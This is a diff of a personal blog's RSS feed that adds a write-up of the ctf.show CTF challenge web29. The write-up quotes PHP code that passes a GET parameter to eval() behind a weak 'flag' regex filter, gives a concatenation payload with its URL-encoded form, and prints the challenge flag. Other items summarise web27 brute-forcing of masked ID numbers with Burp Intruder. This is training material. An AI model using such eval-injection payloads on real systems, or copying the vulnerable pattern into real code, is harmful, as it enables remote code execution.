@@ -1,5 +1,67 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Sun, 13 Sep 2026 15:17:42 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web28_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web28_Web-ru-men-_ctf.show.html</link><description>打开靶机发现 302 跳转到`/0/1/2.txt`，页面只有一句话：`web28:where is flag?`，Ctrl+U查看源代码也只有这一句话，题目提示`大海捞针`，访问任何其他文件似乎都会触发无限 302 跳转一直在 URL 中间拼接 `/0/1`，触发 Chromium 浏览器的 ERR_TOO_MANY_REDIRECTS（网站将您重定向的次数过多。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_web28_Web-ru-men-_ctf.show.html</guid><pubDate>Sun, 13 Sep 2026 15:17:14 +0000</pubDate></item><item><title>WriteUp_web27_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web27_Web-ru-men-_ctf.show.html</link><description>打开靶机发现是一个教务管理系统，点击`录取名单`链接即可下载到一个 Excel 表格 `list.xlsx`，里面有被录取的学生的姓名和隐去了第7-14位也就是生日部分的身份证号码，点击`学生学籍信息查询系统`发现可以使用姓名和身份证号查询，使用 Burp Suite Professional（Community Edition/社区版好像会限制 Intruder 的速度，不知道会不会太慢需要等太久）创建临时项目打开内置的 Chromium 浏览器随便输入一个学生的信息抓包，将其中的 POST 请求发送到 Intruder（Send to Intruder Ctrl+I）
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Tue, 15 Sep 2026 02:25:11 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web29_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web29_Web-ru-men-_ctf.show.html</link><description>题目提示`命令执行，需要严格的过滤`，估计有什么接口没做过滤就直接执行用户输入的命令了
+```php
+&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:26:48
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match('/flag/i', $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+由于存在 preg_match 不区分大小写（/i）匹配 flag，命令中不能直接出现 `flag` 否则不会被执行，使用拼接的方式可以不直接出现可被匹配的 `flag` 四个连续字母但达到相同的效果
+
+```
+$a='fla'; $b='g.php'; highlight_file($a.$b);
+```
+
+经过浏览器自动 URL 编码后是这样的
+```
+/?c=$a=%27fla%27;%20$b=%27g.php%27;%20highlight_file($a.$b);
+```
+
+或者去掉空格会更简单一点，%27应该就是单引号
+```
+/?c=$a=%27fla%27;$b=%27g.php%27;highlight_file($a.$b);
+```
+
+```php
+&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:14:07
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:14:17
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+$flag = 'ctfshow{b174ee85-c133-46b9-997d-934a41fa5581}';
+```
+
+下面是 Gemini 3.8 Flash 给出的回答，我测试了前三个绕过都没有成功，第四个成功了所以放在上面
+
+**不会直接显示**。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_web29_Web-ru-men-_ctf.show.html</guid><pubDate>Tue, 15 Sep 2026 02:24:40 +0000</pubDate></item><item><title>WriteUp_web28_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web28_Web-ru-men-_ctf.show.html</link><description>打开靶机发现 302 跳转到`/0/1/2.txt`，页面只有一句话：`web28:where is flag?`，Ctrl+U查看源代码也只有这一句话，题目提示`大海捞针`，访问任何其他文件似乎都会触发无限 302 跳转一直在 URL 中间拼接 `/0/1`，触发 Chromium 浏览器的 ERR_TOO_MANY_REDIRECTS（网站将您重定向的次数过多。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_web28_Web-ru-men-_ctf.show.html</guid><pubDate>Sun, 13 Sep 2026 15:17:14 +0000</pubDate></item><item><title>WriteUp_web27_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web27_Web-ru-men-_ctf.show.html</link><description>打开靶机发现是一个教务管理系统，点击`录取名单`链接即可下载到一个 Excel 表格 `list.xlsx`，里面有被录取的学生的姓名和隐去了第7-14位也就是生日部分的身份证号码，点击`学生学籍信息查询系统`发现可以使用姓名和身份证号查询，使用 Burp Suite Professional（Community Edition/社区版好像会限制 Intruder 的速度，不知道会不会太慢需要等太久）创建临时项目打开内置的 Chromium 浏览器随便输入一个学生的信息抓包，将其中的 POST 请求发送到 Intruder（Send to Intruder Ctrl+I）
 
 &lt;img width='2558' height='1524' alt='Image' src='https://github.com/user-attachments/assets/4df8b4ba-e3ab-4ec2-bb32-c1855f5ae144' /&gt;
 
